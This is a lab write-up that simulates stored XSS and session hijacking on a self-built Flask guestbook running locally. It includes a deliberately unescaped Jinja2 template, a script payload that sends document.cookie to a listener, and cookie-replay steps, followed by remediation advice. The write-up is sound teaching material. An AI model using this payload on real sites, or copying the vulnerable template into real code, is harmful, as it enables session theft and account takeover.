# Stored XSS and Session Hijacking Simulation

**Target:** Custom-built vulnerable Flask guestbook application (self-hosted, `127.0.0.1:5000`)
**Author:** Wise Achah Mutah
**Environment:** Local simulation — no external services, no third-party lab, no cost

---

## 1. Objective

This writeup demonstrates:

- A stored XSS vulnerability where malicious input persists on the server and executes against every user who later views the affected page
- A payload that exfiltrates a simulated session cookie to a listener under the attacker's control, without any direct interaction from the victim
- Practical session hijacking using the stolen cookie
- The difference between reflected and stored XSS in terms of persistence and blast radius
- Recommended remediation

---

## 2. The Vulnerable Application

A small Flask guestbook app (`app.py`) was built specifically for this simulation. It assigns every visitor a simulated session cookie (`session_id`, a random UUID) and lets users post comments that are stored server-side and shown to **every** subsequent visitor.

The vulnerability: comments are rendered using Jinja2's `|safe` filter, which explicitly disables Jinja2's default HTML autoescaping:

```python
{% for c in comments %}
    <div class="comment">{{ c|safe }}</div>
{% endfor %}
```

Because of this, any HTML or JavaScript submitted in a comment is written directly into the page's HTML and executed by the browser of anyone who loads the guestbook afterward — this is what makes the vulnerability **stored** (persistent across visits) rather than reflected (contained to a single request).

A second script (`listener.py`) plays the role of the attacker's server: a minimal local HTTP listener on port 8000 that logs any cookie value sent to `/steal`.

![Clean guestbook before any payload, showing the attacker's own session ID](stored-screenshots/01-baseline-guestbook.png)

---

## 3. Injecting the Stored Payload

The following payload was submitted through the comment field:

```html
<script>fetch('http://127.0.0.1:8000/steal?cookie=' + document.cookie)</script>
```

![Payload entered into the guestbook's comment field](stored-screenshots/02-payload-entered.png)

Once submitted, the comment is saved server-side in the application's in-memory comment list — permanently, until the app restarts — meaning it will now execute for every single visitor who loads the guestbook page, not just the one who posted it.

Immediately after posting, the listener logged the poster's own cookie, confirming the script executed on submission:

![Listener terminal capturing the first cookie — the attacker's own session, fired immediately on submission](stored-screenshots/03-listener-first-capture.png)

---

## 4. Proving Persistence — A Separate Victim Is Compromised Automatically

To simulate a real second user, a private/incognito browser window was opened — a completely separate browser identity with no prior cookies, standing in for a victim who has never interacted with the attacker in any way.

Visiting the guestbook in this window assigned a brand new session cookie, distinct from the attacker's:

![Victim's incognito window showing a different session ID, having only viewed the page normally](stored-screenshots/04-victim-incognito-session.png)

The victim did not click a link, submit a form, or take any malicious action — they simply loaded the guestbook to read comments, exactly as an ordinary user would. Because the payload is now stored on the server, it executed automatically in the victim's browser too, sending their session cookie to the listener without their knowledge:

![Listener now showing a second captured cookie, belonging to the separate victim session](stored-screenshots/05-listener-second-capture.png)

This is the defining property of stored XSS: the attacker did not need to target this specific victim, craft a link, or get them to click anything. Simply visiting the already-compromised page was enough.

---

## 5. Session Hijacking — Using the Stolen Cookie

With the victim's `session_id` value captured, it was used to impersonate them:

1. The victim's stolen session ID was copied from the listener's log
2. In a separate, normal (non-incognito) browser — previously showing the attacker's own session — Developer Tools were opened to the Application/Storage tab
3. The `session_id` cookie value was manually overwritten with the victim's stolen ID
4. The page was reloaded

![Session hijack confirmed — the browser's session banner and stored cookie now both show the victim's session ID, not the attacker's original one](stored-screenshots/06-session-hijack-confirmed.png)

The application now treats this browser as the victim, purely because it presents the victim's session identifier. In a real application, this is precisely the mechanism by which an attacker would gain access to a victim's authenticated session — viewing their data, performing actions as them, or accessing account settings — without ever knowing their password.

---

## 6. Reflected vs. Stored XSS — Persistence and Blast Radius

| Aspect | Reflected XSS | Stored XSS |
|---|---|---|
| **Where the payload lives** | Only in the specific request/URL that carries it — never saved on the server | Saved server-side (database, in-memory store, file) |
| **Persistence** | Exists for a single request only; gone once that response is served | Persists indefinitely, until the stored data is removed |
| **How a victim is exposed** | Must be individually targeted — the victim has to click a specific crafted link | No targeting needed — anyone who simply views the affected page is exposed |
| **Blast radius** | Limited to whoever clicks the attacker's link | Every past, present, and future visitor to the affected page, until the payload is removed |
| **Attacker effort per victim** | High — a new malicious link must reach each victim individually (e.g. via phishing) | Low — one injection compromises an unbounded number of victims automatically |
| **Demonstrated in this lab** | [Reflected XSS Exploitation writeup] — required a crafted URL sent to a specific target | This lab — a single guestbook comment compromised both the attacker's own session and a completely separate victim session automatically |

Stored XSS is generally considered more severe precisely because of this blast radius difference: a single successful injection can silently compromise every user of a page indefinitely, with no further action required from the attacker after the initial post.

---

## 7. Root Cause

As in the reflected case, the underlying issue is a failure to treat user-supplied input as data rather than executable code. Here specifically, the developer explicitly disabled the templating engine's default output encoding using the `|safe` filter, telling the browser to render the comment's raw HTML/JavaScript exactly as submitted, with no escaping applied.

---

## 8. Remediation

- **Output encoding (the primary fix)** — never use `|safe` (or equivalents like `dangerouslySetInnerHTML`, `innerHTML =`) on user-supplied content. Let the templating engine's default HTML-escaping apply, so `<script>` becomes inert text (`&lt;script&gt;`) rather than executable markup.
- **Input validation** — as defense-in-depth, restrict or strip disallowed characters/tags from user submissions (e.g. an allowlist of safe formatting tags for a comment field), though this should never be relied on as the sole control.
- **Content-Security-Policy (CSP)** — a strict CSP blocking inline script execution (`script-src 'self'`, no `unsafe-inline`) would have prevented the injected `<script>` tag from executing at all, even though it was stored and served.
- **`HttpOnly`, `Secure`, `SameSite` cookie flags** — setting `HttpOnly` on the session cookie would have prevented `document.cookie` from reading it via JavaScript entirely, neutralizing this specific exfiltration technique regardless of the underlying XSS bug.

---

## 9. Conclusion

This simulation demonstrated a stored XSS vulnerability in a guestbook comment field, caused by disabling output encoding on user input. A single malicious comment compromised not only the poster's own session but also a completely separate, uninvolved visitor's session automatically — with no phishing link, no click, and no targeting required. The stolen session cookie was then successfully replayed to hijack that victim's session. Compared to reflected XSS, this highlights stored XSS's far larger blast radius: one injection point can silently compromise every subsequent visitor until the payload is found and removed, making output encoding, CSP, and `HttpOnly` cookies essential layered defenses.

---

### Screenshots

- `01-baseline-guestbook.png` — clean guestbook before any payload
- `02-payload-entered.png` — malicious comment entered
- `03-listener-first-capture.png` — attacker's own cookie captured on submission
- `04-victim-incognito-session.png` — separate victim session, no interaction with payload
- `05-listener-second-capture.png` — victim's cookie captured automatically
- `06-session-hijack-confirmed.png` — attacker's browser now shows the victim's session ID after cookie replay

### Lab files

- `app.py` — the vulnerable guestbook application
- `listener.py` — the local cookie-capture listener
